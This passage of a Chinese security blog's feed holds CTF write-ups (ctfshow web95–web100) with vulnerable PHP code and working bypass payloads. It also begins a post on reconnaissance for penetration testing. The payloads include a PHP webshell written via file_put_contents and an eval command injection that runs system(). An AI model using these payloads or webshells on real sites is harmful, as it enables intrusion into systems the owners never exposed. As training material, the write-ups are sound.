class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]|\./i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">web95相较web94的不同在于(preg_match(&quot;/[a-z]|\./i&quot;, $num)，正则还匹配了&#x27;.&#x27;<br>导致web94的方法不能用了<br><br>但是我们还可以用空格加八进制绕过，或者+绕过<br>payload:http://example.com/script.php?num=%20010574<br>payload:http://example.com/script.php?num=%0a010574<br></code></pre></td></tr></table></figure><h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]==<span class="hljs-string">&#x27;flag.php&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">这个 PHP 代码片段允许用户查看任意文件的内容，除了名为 flag.php 的文件。<br>由于代码只检查了 u 参数是否严格等于字符串 flag.php<br>但没有处理其他可能等价的路径或者符号链接，因此可以尝试以下绕过方法:<br>使用相对路径：payload:http://example.com/script.php?u=./flag.php<br>使用绝对路径：payload:http://example.com/script.php?u=/var/www/html/flag.php<br></code></pre></td></tr></table></figure><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">这里的关键是找到两个不同的输入，它们的 MD5 哈希值相同。这种情况称为哈希碰撞<br>可以传入数组绕过强比较<br>payload:http://example.com/script.php<br>post：a[]=1&amp;b[]=2<br></code></pre></td></tr></table></figure><h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$_GET</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_POST</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_COOKIE</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_SERVER</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$flag</span>:<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">此题用到了三元运算符，并且有点复杂，所以仔细分析一下<br><span class="hljs-variable">$_GET</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_POST</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br>这里检查 <span class="hljs-variable">$_GET</span> 是否存在（即是否有任何 GET 参数）。<br>如果存在，则 <span class="hljs-variable">$_GET</span> 被赋值为 <span class="hljs-variable">$_POST</span> 的引用。<br><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_COOKIE</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br>如果 <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] 等于 <span class="hljs-string">&#x27;flag&#x27;</span>，则 <span class="hljs-variable">$_GET</span> 被赋值为 <span class="hljs-variable">$_COOKIE</span> 的引用。<br><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_SERVER</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br>如果 <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] 等于 <span class="hljs-string">&#x27;flag&#x27;</span>，则 <span class="hljs-variable">$_GET</span> 被赋值为 <span class="hljs-variable">$_SERVER</span> 的引用。<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$flag</span>:<span class="hljs-keyword">__FILE__</span>);<br>检查 <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;HTTP_FLAG&#x27;</span>] 是否等于 <span class="hljs-string">&#x27;flag&#x27;</span>，如果是，则显示 <span class="hljs-variable">$flag</span> 的内容，否则显示当前文件的内容。<br><br>其实总结起来，中间两句不要看，我们直接传入GET为<span class="hljs-number">1</span>=<span class="hljs-number">1</span>，POST为HTTP_FLAG=flag<br><span class="hljs-variable">$_GET</span>存在，<span class="hljs-variable">$_GET</span>变为<span class="hljs-variable">$_POST</span>的引用，又因为<span class="hljs-variable">$_POST</span>的HTTP_FLAG=flag<br>所以<span class="hljs-variable">$_GET</span>会变成HTTP_FLAG=flag，即可显示<span class="hljs-variable">$flag</span><br></code></pre></td></tr></table></figure><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$allow</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">36</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x36d</span>; <span class="hljs-variable">$i</span>++) &#123; <br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$allow</span>, <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-variable">$i</span>));<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>], <span class="hljs-variable">$allow</span>))&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">36</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x36d</span>; <span class="hljs-variable">$i</span>++) &#123; <br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$allow</span>, <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-variable">$i</span>));<br>&#125;<br>这个循环用于构建一个数组 <span class="hljs-variable">$allow</span>，该数组包含从 <span class="hljs-number">1</span> 到 <span class="hljs-number">0x36d</span>（十进制为 <span class="hljs-number">877</span>）之间的随机数。<br>这些随机数是允许的文件名。<br>    <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>], <span class="hljs-variable">$allow</span>))&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>&#125;<br>这个条件检查了是否设置了 GET 请求中的 n 参数，并且该参数的值存在于 <span class="hljs-variable">$allow</span> 数组中。<br>如果条件成立，它会使用 file_put_contents 函数将 POST 请求中的内容写入文件，文件名由 n 参数指定。<br><br>这题可以利用n参数新建一个文件<span class="hljs-number">1</span>.php，然后传入content写入这个文件<br>因为对写入的文件没有内容限制，我们可以写一个webshell进去，<br>再到<span class="hljs-number">1</span>.php内部，执行php命令读取flag<br>首先GET传入n=<span class="hljs-number">1</span>.php POST传入content=<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br>    在<span class="hljs-number">1</span>.php中POST传入a=ls<br>    得到目录下的文件有<span class="hljs-number">1</span>.php flag36d.php index.php <br>    读取flag36d.php即可获取flag<br>    （但是这里只能用tac读取，估计是其他的都被禁用了，并且蚁剑连不上）<br></code></pre></td></tr></table></figure><h3 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;ctfshow.php&quot;</span>);<br><span class="hljs-comment">//flag in class ctfshow;</span><br><span class="hljs-variable">$ctfshow</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v0</span>=<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v0</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-subst">$v3</span>&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs perl">这题很长分析一下部分代码的功能<br>$ctfshow = new ctfshow();<br>初始化 ctfshow 对象<br><br>$v0 = is_numeric($v1) <span class="hljs-keyword">and</span> is_numeric($v2) <span class="hljs-keyword">and</span> is_numeric($v3);<br>检查 v1, v2, v3 是否都是数字。<br><br><span class="hljs-keyword">if</span> ($v0) &#123;<br>    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&quot;/\;/&quot;</span>, $v2)) &#123;<br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/\;/&quot;</span>, $v3)) &#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br>首先检查 v<span class="hljs-number">0</span> 是否为真，即 v1是否为数字<br>为什么v2和v3不用为数字：经过我的对比研究<br>$v0 = is_numeric($v1) <span class="hljs-keyword">and</span> is_numeric($v2) <span class="hljs-keyword">and</span> is_numeric($v3);<br>中，只需要第一个参数为true即可，若第一个参数为数字后面随便传。<br><br>然后检查 v2 中不包含分号 (;)。<br>最后检查 v3 中包含分号 (;)。<br>如果上述条件都满足，执行 <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;</span>);。<br><br>可以构造<br>$v1 = <span class="hljs-number">1</span><br>$v2 = <span class="hljs-keyword">system</span><br>$v3 = <span class="hljs-number">1</span>;phpinfo();<br>这个是ChatGPT告诉我的，并且命令可以执行并且回显phpinfo界面<br>利用这个可以把v3改为;<span class="hljs-keyword">system</span>(%27ls%27);<br>回显ctfshow.php flag36d.php index.php<br> 查看flag36.php   $flag=<span class="hljs-string">&quot;flag_here&quot;</span>;<br> 没有flag，再看ctfshow.php<br> $flag_is_e26f6cf00x2d13a00x2d4f090x2d9d910x2d7fbfabadd533;<br> 让gpt帮我分析得到flag里面应该是e26f6cf<span class="hljs-number">0</span>-<span class="hljs-number">13</span>a<span class="hljs-number">0</span>-<span class="hljs-number">4</span>f09-<span class="hljs-number">9</span>d91-<span class="hljs-number">7</span>fbfabadd533<br> 也就是<span class="hljs-number">0x2d</span> 表示 -（减号）<br> 最后的payload：?v1=<span class="hljs-number">1</span>&amp;v2=<span class="hljs-keyword">system</span>&amp;v3=;<span class="hljs-keyword">system</span>(%27tac%20ctfshow.php%27);<br> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>渗透之信息收集</title>
    <link href="/2024/04/27/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/"/>
    <url>/2024/04/27/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<p><img src="/images/informationGathering/"></p><h3 id="渗透测试流程："><a href="#渗透测试流程：" class="headerlink" title="渗透测试流程："></a>渗透测试流程：</h3><p><strong>确认信息 信息收集 漏洞扫描 漏洞利用 形成报告</strong></p><h3 id="信息收集的内容："><a href="#信息收集的内容：" class="headerlink" title="信息收集的内容："></a>信息收集的内容：</h3><p><strong>域名信息、IP段、开放的端口、网站架构、文件目录结构、软件版本、WAF、旁站、C段…</strong></p><h2 id="域名相关信息："><a href="#域名相关信息：" class="headerlink" title="域名相关信息："></a>域名相关信息：</h2><p><strong>什么是域名</strong>：域名(Domain Name)是一个映射到数字 IP 地址的文本字符串，可用于从客户端软件访问网站。例如baidu.com就是一个域名</p><p><strong>域名分类</strong></p><p>国际域名：.com(商业域名)；.net(网络服务)；.org(组织协会等)；.gov(政府部门)；.edu(教育机构)；.mil(军事领域)；.int(国际组织)</p><p>国别域名：.CN代表中国，.UK代表英国，.US代表美国</p><p>新顶级域名：biz, info, name, pro, aero, coop, museum ……</p><p><strong>域名联系人信息</strong>：所属人，邮箱，电话，地址……</p><p><strong>whois查询：</strong><a href="http://whois.chinaz.com/">http://whois.chinaz.com</a>  <a href="https://www.whois.com/">https://www.whois.com</a>  <a href="http://whois.cnnic.cn/">http://whois.cnnic.cn</a></p><p>kali里面也可以whois查询 <code>whois 域名</code>即可查询</p><p>可以设置隐藏信息，查询不到相关信息</p><p><strong>域名反查</strong>：<a href="http://whois.chinaz.com/reverse">http://whois.chinaz.com/reverse</a> 可以通过邮箱，注册人，电话反查其他相关域名</p><p><strong>ICP备案查询：</strong>工信部备案查询 <a href="http://beian.miit.gov.cn/">http://beian.miit.gov.cn</a>   其他<a href="https://icp.chinaz.com/">https://icp.chinaz.com</a> <a href="http://beian88.com/">http://beian88.com</a></p><p>ICP备案是互联网内容提供商备案的简称，是一种对互联网信息服务提供者的资质和信息进行审核和登记的过程。在我国境内开展互联网信息服务业务的企业或个人，需要进行ICP备案。国内IP绑定域名需要在主机商备案，如果没有备案，即使绑定了域名也无法将域名解析成对应ip地址。（如果购买的是国外的服务器则没有备案要求）</p><p><strong>企业信息查询</strong>：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com</a></p><p><strong>子域名：</strong>子域名(Subdomain)是在域名系统等级中，属于更高一层域的域。例如<a href="http://www.baidu.com/">www.baidu.com</a> 的子域名为news.baidu.com</p><p><strong>子域名查询：</strong></p><p>1、字典猜解   layer子域名挖掘机  其他工具<a href="http://github.com/lijiejie/subDomainsBrute">http://github.com/lijiejie/subDomainsBrute</a></p><p>2、枚举 自己一个个试，如果连接成功则存在</p><p><strong>域名DNS信息：</strong>域名解析服务(Domain Name Server)是将域名转化为相应的IP地址的过程</p><p><strong>域名解析服务</strong>：<a href="http://dnspod.cn/">http://dnspod.cn</a></p><p>在设置DNS解析时，需要选择不同的记录类型。常见的记录类型有</p><p>1.A记录</p><p>A记录是最常见和最常用的一种记录类型，用于指定主机名和IP（IPv4）地址之间的关系。通过添加A记录，网站管理者可以将域名与网站服务器地址进行绑定。</p><p>2.AAAA记录</p><p>与A记录相对的是，AAAA记录是用于将域名解析到IPv6地址的一种DNS记录类型。国内很多解析服务器不支持AAAA记录的设置，如果想进行AAAA记录解析，就需要将域名的NS记录指向一些专业的域名解析厂商。</p><p>3.CNAME记录</p><p>CNAME记录也是比较常用的一种记录类型，它是主机名到主机名的映射。如果需要将域名指向另一个域名，而不是一个IP地址，那么就需要添加一条CNAME记录。在CDN、企业邮箱、全局流量管理等业务场景下，经常会使用到CNAME记录。</p><p>4.NS记录</p><p>NS记录用于将子域名交给其他DNS服务商解析时使用，从某种意义上来讲NS记录相当于设置子域名解析服务器的A记录，用于在解析请求时确定该服务器的IP地址。大多数域名注册商默认使用自己的NS记录来解析用户的域名，但用户也可以设置NS记录指向更专业安全的域名解析厂商。</p><p>5.MX记录</p><p>MX记录是邮件交换记录，主要用于邮箱解析，在发送邮件时根据收件人的地址后缀进行邮件服务器的定位。MX记录的权重对邮件服务非常重要，发送邮件时，会先对域名进行解析，查找MX记录，按照权重从小到大的顺序联通服务器进行邮件发送。</p><p>6.TXT记录</p><p>TXT记录，一般用于某个主机名的标识和说明，通过设置TXT记录可以使别人更方便地联系到你。此外TXT记录还常用于做SPF反垃圾邮件和SSL证书的DNS验证等。</p><p><strong>域名解析查询：</strong><a href="https://ipw.cn/dns">https://ipw.cn/dns</a>          <a href="http://sitereport.netcraft.com/">http://sitereport.netcraft.com</a>    </p><h2 id="IP相关信息："><a href="#IP相关信息：" class="headerlink" title="IP相关信息："></a>IP相关信息：</h2><p><strong>DNS解析流程：</strong>主机往<strong>本地域名服务器(Local DNS Server)</strong> 发送DNS域名解析请求，如果本地没有就会发往根<strong>域名服务器(Root DNS Server)</strong> 发往请求,根域名服务器发回来一个<strong>顶级域名服务器(Top Level DNS Server)</strong> ，本地域名服务器再往顶级域名服务器发送请求，接受请求的顶级DNS服务器查找并返回此域名对应的<strong>Name Server域名服务器</strong> 的地址，这个Name Server服务器就是我要访问的网站域名提供商的服务器，其实该域名的解析任务就是由域名提供商的服务器来完成， Name Server服务器会查询存储的域名和IP的映射关系表，再把查询出来的域名和IP地址等等信息，连同一个TTL值返回给本地DNS服务器。</p><p><strong>递归查询</strong>：客户端只发一次请求，要求对方给出最终结果。</p><p><strong>迭代查询</strong>：客户端发出一次请求，对方如果没有授权回答，它就会返回一个能解答这个查询的其它名称服务器列表，客户端会再向返回的列表中发出请求，直到找到最终负责所查域名的名称服务器，从它得到最终结果。</p><p><strong>ping&#x2F;nslookup：</strong></p><p><strong>ping(因特网包探索器&#x2F;Packet Internet Groper)</strong> 是工作在TCP&#x2F;IP网络体系结构中应用层的一个服务命令， 主要是向特定的目的主机发送 ICMP（Internet Control Message Protocol 因特网报文控制协议）Echo 请求报文，测试目的站是否可达及了解其有关状态</p><p><strong>Nslookup(name server lookup)( 域名查询)</strong> 是一个用于查询 Internet域名信息或诊断DNS 服务器问题的工具.</p><p><strong>IP归属查询：</strong> <a href="http://ipwhois.cnnic.net.cn/">http://ipwhois.cnnic.net.cn</a>           <a href="http://ip138.com/">http://ip138.com</a></p><p><strong>CDN:</strong> CDN(Content Delivery Network&#x2F;内容分发网络)。它是建立并覆盖在承载网之上，由分布在不同区域的边缘节点服务器群组成的分布式网络。CDN 的关键技术主要有内容存储和分发技术，简单来讲，CDN就是根据用户位置分配最近的资源，于是，用户在上网的时候不用直接访问源站，而是访问离他“最近的”一个 CDN 节点(也叫做“边缘节点”、edge node)，其实就是缓存了源站内容的代理服务器。</p><p><strong>如何获得CDN背后的真实IP:</strong> 因为CDN的存在我们不一定能访问到源服务器，因此拿不到源服务器真实IP。</p><p>​<a href="https://ping.chinaz.com/">超级ping</a>：如果Ping到多个ip则说明用了CDN </p><p>​<strong>历史DNS查询ip:</strong>  <a href="http://dnshistory.org/">http://dnshistory.org</a>      <a href="http://sitereport.netcraft.com/">http://sitereport.netcraft.com</a>      </p><p>​<strong>通过子域名查询ip：</strong> 主站用了CDN但是子站不一定用了CDN，如果子站和主站同一ip则可拿到真实ip</p><p>​<strong>国外主机解析查询ip：</strong> 对于没有国外CDN节点的网站可以用 <a href="https://www.webpagetest.org/">https://www.webpagetest.org</a>                                        <a href="https://dnscheck.pingdom.com/">https://dnscheck.pingdom.com</a></p><p>​其他：邮件，SSL证书，手机APP抓包，空间搜索引擎等。</p><h2 id="端口服务相关信息："><a href="#端口服务相关信息：" class="headerlink" title="端口服务相关信息："></a>端口服务相关信息：</h2><p><strong>查看本机端口信息：</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Windows<br>netstat -aon<span class="hljs-string">|findstr 3306</span><br>Linux<br>netstat -an<span class="hljs-string">|grep 3306</span><br>如果<span class="hljs-number">3306</span>端口打开了那么就会有回显<br></code></pre></td></tr></table></figure><h2 id="指纹识别："><a href="#指纹识别：" class="headerlink" title="指纹识别："></a>指纹识别：</h2><h2 id="Google-Hacking："><a href="#Google-Hacking：" class="headerlink" title="Google Hacking："></a>Google Hacking：</h2><h2 id="目录信息："><a href="#目录信息：" class="headerlink" title="目录信息："></a>目录信息：</h2><h2 id="Git-Hack："><a href="#Git-Hack：" class="headerlink" title="Git Hack："></a>Git Hack：</h2>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>红队打靶W1R3S打靶思路</title>
